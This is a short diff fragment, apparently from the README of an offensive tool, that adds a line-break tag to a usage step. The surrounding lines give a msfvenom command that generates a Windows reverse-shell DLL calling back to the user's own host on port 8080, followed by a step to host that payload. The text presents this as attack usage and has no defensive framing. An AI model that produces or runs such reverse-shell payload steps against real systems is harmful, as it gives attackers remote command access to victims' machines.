@@ -8,7 +8,7 @@
 
 ## Usage
 
-1. Generate DLL payload:
+1. Generate DLL payload: <br>
    `msfvenom -p windows/shell_reverse_tcp LHOST=<your_ip> LPORT=8080 -f dll > shell.dll`
 
 2. Host the payload:
